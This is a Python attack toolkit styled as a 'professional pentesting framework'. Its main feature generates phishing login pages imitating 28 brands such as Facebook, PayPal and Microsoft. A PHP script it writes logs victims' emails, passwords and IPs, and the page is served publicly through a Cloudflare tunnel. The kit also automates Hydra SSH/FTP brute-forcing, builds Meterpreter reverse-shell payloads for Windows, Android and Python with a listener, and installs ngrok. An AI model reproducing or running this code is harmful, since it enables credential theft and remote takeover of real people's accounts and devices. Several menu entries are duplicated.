#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════════
# Mazen ZAP Pro v6.0 – Professional Pentesting Framework for Kali Linux
# Features: 28 Templates | Nmap | Hydra | Metasploit | ZAP | Session Logger
# ═══════════════════════════════════════════════════════════════════════════

import sys
import os
import subprocess
import time
import json
import shutil
import platform
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

VERSION = "6.0.0"
WORK_DIR = os.path.dirname(os.path.abspath(__file__))

# ==================== المسارات ====================
PATHS = {
    "output": os.path.join(WORK_DIR, "output"),
    "logs": os.path.join(WORK_DIR, "logs"),
    "payloads": os.path.join(WORK_DIR, "payloads"),
    "reports": os.path.join(WORK_DIR, "reports"),
    "wordlists": os.path.join(WORK_DIR, "wordlists"),
    "sessions": os.path.join(WORK_DIR, "sessions")
}

for path in PATHS.values():
    os.makedirs(path, exist_ok=True)

SESSION_FILE = os.path.join(PATHS["sessions"], f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
LOG_FILE = os.path.join(PATHS["logs"], "mzap.log")

# ==================== قائمة المواقع (28 قالباً) ====================
SITES = {
    "1": "Facebook", "2": "Google", "3": "Twitter", "4": "Microsoft",
    "5": "Netflix", "6": "Paypal", "7": "Steam", "8": "Twitch",
    "9": "Pinterest", "10": "Pinterest", "11": "GitHub", "12": "Discord",
    "13": "TikTok", "14": "Playstation", "15": "Adobe", "16": "Ebay",
    "17": "Snapchat", "18": "Google", "19": "LinkedIn", "20": "Instagram",
    "21": "Spotify", "22": "Reddit", "23": "Protonmail", "24": "Wordpress",
    "25": "Dropbox", "26": "Roblox", "27": "Twitter", "28": "Kuraimi"
}

# ==================== دوال التسجيل ====================
def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"[{timestamp}] [{level}] {msg}\n")
    
    if level == "ERROR":
        print(Fore.RED + f"[-] {msg}")
    elif level == "SUCCESS":
        print(Fore.GREEN + f"[+] {msg}")
    elif level == "WARNING":
        print(Fore.YELLOW + f"[!] {msg}")
    else:
        print(Fore.CYAN + f"[*] {msg}")

def log_operation(operation, target="", result=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(SESSION_FILE, "a", encoding='utf-8') as f:
        f.write(f"[{timestamp}] | {operation} | {target} | {result}\n")

# ==================== فحص الأدوات ====================
def check_tool(tool_name, install_cmd=None):
    if shutil.which(tool_name):
        return True
    log(f"{tool_name} not found", "WARNING")
    if install_cmd and input(f"Install {tool_name}? (y/n): ").lower() == 'y':
        os.system(install_cmd)
        return shutil.which(tool_name) is not None
    return False

def check_dependencies():
    """فحص وتثبيت الأدوات المطلوبة"""
    is_kali = "kali" in platform.version().lower() or os.path.exists("/usr/share/kali-defaults")
    
    tools = {
        "nmap": "sudo apt install nmap -y",
        "hydra": "sudo apt install hydra -y",
        "msfvenom": "sudo apt install metasploit-framework -y",
        "zap.sh": "sudo apt install zaproxy -y" if is_kali else "echo 'Install ZAP manually'"
    }
    
    for tool, cmd in tools.items():
        check_tool(tool, cmd)
    
    log("Dependencies checked", "SUCCESS")

# ==================== قوائم كلمات المرور ====================
def setup_wordlists():
    """تجهيز قوائم كلمات المرور"""
    wordlists = {}
    
    # fast.txt
    fast_path = os.path.join(PATHS["wordlists"], "fast.txt")
    if not os.path.exists(fast_path):
        with open(fast_path, "w") as f:
            words = ["admin", "root", "123456", "password", "toor", "qwerty", "letmein",
                     "welcome", "monkey", "dragon", "master", "sunshine", "passw0rd",
                     "admin123", "password123", "12345678", "qwerty123"]
            f.write("\n".join(words))
    wordlists["fast.txt"] = fast_path
    
    # users.txt
    users_path = os.path.join(PATHS["wordlists"], "users.txt")
    if not os.path.exists(users_path):
        with open(users_path, "w") as f:
            users = ["admin", "root", "user", "test", "administrator", "webadmin"]
            f.write("\n".join(users))
    wordlists["users.txt"] = users_path
    
    return wordlists

# ==================== قوالب HTML ====================
def create_phishing_page(site_name, output_file):
    """إنشاء صفحة تصيد للموقع المختار"""
    html = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>{site_name} - تسجيل الدخول</title>
<style>
body{{background:#f0f2f5;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
.card{{background:#fff;padding:40px;border-radius:8px;width:350px;text-align:center}}
input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px}}
button{{background:#1877f2;color:#fff;padding:12px;border:none;border-radius:6px;width:100%;cursor:pointer}}
.logo{{color:#1877f2;font-size:24px;font-weight:bold;margin-bottom:20px}}
</style>
</head>
<body>
<div class="card">
<div class="logo">{site_name}</div>
<form method="POST" action="login.php">
<input type="text" name="email" placeholder="البريد الإلكتروني" autofocus>
<input type="password" name="password" placeholder="كلمة السر">
<button type="submit">تسجيل الدخول</button>
</form>
</div>
</body>
</html>'''
    
    with open(output_file, "w", encoding='utf-8') as f:
        f.write(html)
    return output_file

def create_login_php():
    """إنشاء ملف login.php لجمع البيانات"""
    php_file = os.path.join(PATHS["reports"], "login.php")
    php_content = '''<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$data = "[$date] IP: $ip | Email: $email | Pass: $password\n";
file_put_contents("credentials.txt", $data, FILE_APPEND);
header("Location: https://www.facebook.com");
exit();
?>'''
    with open(php_file, "w") as f:
        f.write(php_content)
    return php_file

# ==================== واجهة المستخدم ====================
def banner():
    print(Fore.CYAN + """
╔══════════════════════════════════════════════════════════════════════════╗
║   ███╗   ███╗ █████╗ ███████╗███████╗███╗   ██╗                         ║
║   ████╗ ████║██╔══██╗╚══███╔╝██╔════╝████╗  ██║                         ║
║   ██╔████╔██║███████║  ███╔╝ █████╗  ██╔██╗ ██║                         ║
║   ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══╝  ██║╚██╗██║                         ║
║   ██║ ╚═╝ ██║██║  ██║███████╗███████╗██║ ╚████║                         ║
║   ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝                         ║
║                                                                          ║
║              Mazen ZAP Pro v{} – Professional Pentesting Suite         ║
║         Nmap | Hydra | Metasploit | ZAP | 28 Templates | Logger        ║
╚══════════════════════════════════════════════════════════════════════════╝
""".format(VERSION) + Style.RESET_ALL)

def show_menu():
    """عرض قائمة المواقع الخادعة"""
    print(Fore.YELLOW + """
┌─────────────────────────────────────────────────────────────────────────┐
│                           SELECT TARGET SITE                            │
├─────────────────────────────────────────────────────────────────────────┤
│  01) Facebook        10) Pinterest      19) LinkedIn                    │
│  02) Google          11) GitHub         20) Instagram                   │
│  03) Twitter         12) Discord        21) Spotify                     │
│  04) Microsoft       13) TikTok         22) Reddit                      │
│  05) Netflix         14) Playstation    23) Protonmail                  │
│  06) Paypal          15) Adobe          24) Wordpress                   │
│  07) Steam           16) Ebay           25) Dropbox                     │
│  08) Twitch          17) Snapchat       26) Roblox                      │
│  09) Pinterest       18) Google         27) Twitter                     │
│                                       28) Kuraimi                       │
└─────────────────────────────────────────────────────────────────────────┘
""" + Style.RESET_ALL)
    return input(Fore.CYAN + "┌─[" + Fore.WHITE + "mazen" + Fore.CYAN + "]─[" + Fore.YELLOW + "Option" + Fore.CYAN + "]\n└────➤ " + Style.RESET_ALL).strip()

def phish_attack():
    """بدء هجوم التصيد"""
    choice = show_menu()
    if choice not in SITES:
        log("Invalid choice", "ERROR")
        return
    
    site_name = SITES[choice]
    log(f"Starting phishing attack for: {site_name}", "INFO")
    
    # إنشاء صفحة التصيد
    os.makedirs(PATHS["reports"], exist_ok=True)
    index_file = os.path.join(PATHS["reports"], "index.html")
    create_phishing_page(site_name, index_file)
    create_login_php()
    
    # تشغيل خادم PHP
    os.chdir(PATHS["reports"])
    log("Starting PHP server on port 8080...", "INFO")
    subprocess.Popen("php -S 0.0.0.0:8080 > /dev/null 2>&1 &", shell=True)
    time.sleep(2)
    
    # تشغيل النفق
    log("Starting Cloudflare tunnel...", "INFO")
    subprocess.Popen("cloudflared tunnel --url http://localhost:8080 2>/dev/null &", shell=True)
    time.sleep(5)
    
    log(f"Phishing page ready for {site_name}", "SUCCESS")
    print(Fore.GREEN + f"\n📡 Share this link: http://localhost:8080")
    print(Fore.YELLOW + "\n[*] Waiting for credentials... Press Ctrl+C to stop\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("Stopping attack...", "WARNING")
        os.system("pkill -f php")
        os.system("pkill -f cloudflared")
        log("Attack stopped", "INFO")

def network_scan():
    target = input(Fore.CYAN + "Target (IP/range/domain): ").strip()
    if not target:
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = os.path.join(PATHS["output"], f"nmap_{timestamp}.txt")
    cmd = f"sudo nmap -sS -T4 -F {target} -oN {out_file}"
    
    log(f"Running Nmap scan on {target}", "INFO")
    os.system(cmd)
    
    if os.path.exists(out_file):
        log(f"Results saved: {out_file}", "SUCCESS")
    input("\nPress Enter...")

def hydra_brute():
    global wordlists_available
    if not wordlists_available:
        wordlists_available = setup_wordlists()
    
    target = input(Fore.CYAN + "Target IP: ").strip()
    if not target:
        return
    
    print(Fore.CYAN + "\n📚 Wordlists:")
    print("   1. fast.txt (small)")
    print("   2. Custom path")
    choice = input("Choose (1-2): ").strip()
    
    if choice == '1':
        pass_file = wordlists_available.get("fast.txt")
    else:
        pass_file = input("Path to wordlist: ").strip()
    
    print(Fore.YELLOW + "\n[1] SSH\n[2] FTP")
    svc = input("Choose (1-2): ").strip()
    service = "ssh" if svc == '1' else "ftp"
    
    username = input("Username (or 'list' for wordlist): ").strip()
    if username.lower() == 'list':
        user_file = wordlists_available.get("users.txt", "")
        cmd = f"hydra -L {user_file} -P {pass_file} {target} {service} -t 4"
    else:
        cmd = f"hydra -l {username} -P {pass_file} {target} {service} -t 4"
    
    out_file = os.path.join(PATHS["output"], f"hydra_{target}.txt")
    cmd += f" -o {out_file}"
    
    log(f"Running Hydra brute-force...", "INFO")
    os.system(cmd)
    input("\nPress Enter...")

def exploit_menu():
    print(Fore.CYAN + "\n[E] Generate Payload\n[L] Start Listener\n[M] Launch msfconsole")
    opt = input("Choose (E/L/M): ").strip().upper()
    
    if opt == 'E':
        lhost = input("LHOST: ").strip()
        lport = input("LPORT: ").strip()
        print("1. Windows EXE\n2. Android APK\n3. Python")
        ptype = input("Choose (1-3): ").strip()
        
        if ptype == '1':
            cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {PATHS['payloads']}/payload.exe"
        elif ptype == '2':
            cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {PATHS['payloads']}/payload.apk"
        else:
            cmd = f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {PATHS['payloads']}/payload.py"
        
        os.system(cmd)
        log("Payload generated", "SUCCESS")
        
    elif opt == 'L':
        lip = input("Listener IP (0.0.0.0): ").strip() or "0.0.0.0"
        lport = input("Listener Port: ").strip()
        rc_file = os.path.join(PATHS["payloads"], "handler.rc")
        with open(rc_file, "w") as f:
            f.write(f"use exploit/multi/handler\n")
            f.write(f"set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
            f.write(f"set LHOST {lip}\nset LPORT {lport}\nset ExitOnSession false\n")
            f.write(f"exploit -j\n")
        
        terminal = "xfce4-terminal" if shutil.which("xfce4-terminal") else "gnome-terminal"
        os.system(f"{terminal} -e 'msfconsole -r {rc_file}' &")
        log(f"Listener on {lip}:{lport}", "SUCCESS")
        
    elif opt == 'M':
        terminal = "xfce4-terminal" if shutil.which("xfce4-terminal") else "gnome-terminal"
        os.system(f"{terminal} -e 'msfconsole' &")
    
    input("\nPress Enter...")

def tunnel():
    port = input(Fore.CYAN + "Local port to expose (e.g., 8080): ").strip()
    if not port:
        return
    
    if not shutil.which("ngrok"):
        os.system("wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz")
        os.system("tar -xzf ngrok*.tgz && sudo mv ngrok /usr/local/bin/")
        os.system("rm ngrok*.tgz")
    
    terminal = "xfce4-terminal" if shutil.which("xfce4-terminal") else "gnome-terminal"
    os.system(f"{terminal} -e 'ngrok http {port}' &")
    log(f"Tunnel started on port {port}", "SUCCESS")
    input("\nPress Enter...")

def zap_scan():
    log("Launching OWASP ZAP...", "INFO")
    os.system("zap.sh &")
    input("\nPress Enter...")

def view_reports():
    print(Fore.CYAN + f"\n📁 Output: {PATHS['output']}")
    for f in os.listdir(PATHS['output'])[:10]:
        print(f"   📄 {f}")
    input("\nPress Enter...")

def view_session():
    if os.path.exists(SESSION_FILE):
        print(Fore.CYAN + f"\n📋 Session: {SESSION_FILE}")
        with open(SESSION_FILE, "r") as f:
            print(f.read())
    else:
        log("No session", "WARNING")
    input("\nPress Enter...")

def clean():
    for name, path in PATHS.items():
        if name in ["output", "logs", "reports", "payloads"]:
            for f in os.listdir(path):
                try:
                    os.remove(os.path.join(path, f))
                except:
                    pass
    log("Cleaned", "SUCCESS")
    input("\nPress Enter...")

# ==================== التشغيل الرئيسي ====================
def main():
    os.system("clear")
    banner()
    check_dependencies()
    global wordlists_available
    wordlists_available = setup_wordlists()
    log_operation("SESSION_START", f"v{VERSION}", "")
    
    while True:
        print(Fore.YELLOW + """
┌─────────────────────────────────────────────────────────────────────────┐
│                           MAIN MENU                                      │
├─────────────────────────────────────────────────────────────────────────┤
│  [1] 🎯 Phishing Attack (28 Templates)                                  │
│  [2] 🔍 Network Scan (Nmap)                                             │
│  [3] 🔑 Password Brute-force (Hydra)                                    │
│  [4] 🎯 Exploit & Payload (Metasploit)                                  │
│  [5] 📡 Tunnel (Ngrok)                                                  │
│  [6] 💣 Web Scan (OWASP ZAP)                                            │
│  [7] 📊 View Reports / Logs                                             │
│  [8] 📋 Session Log                                                     │
│  [9] 🧹 Clean All                                                       │
│  [0] ❌ Exit                                                            │
└─────────────────────────────────────────────────────────────────────────┘
""" + Style.RESET_ALL)
        
        choice = input(Fore.YELLOW + "Select option: " + Style.RESET_ALL).strip()
        
        if choice == '1':
            phish_attack()
        elif choice == '2':
            network_scan()
        elif choice == '3':
            hydra_brute()
        elif choice == '4':
            exploit_menu()
        elif choice == '5':
            tunnel()
        elif choice == '6':
            zap_scan()
        elif choice == '7':
            view_reports()
        elif choice == '8':
            view_session()
        elif choice == '9':
            clean()
        elif choice == '0':
            log_operation("SESSION_END", "", "")
            print(Fore.GREEN + f"\n[+] Session saved: {SESSION_FILE}")
            print(Fore.RED + "\nExiting...")
            sys.exit(0)
        else:
            log("Invalid choice", "WARNING")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted")
        sys.exit(0)
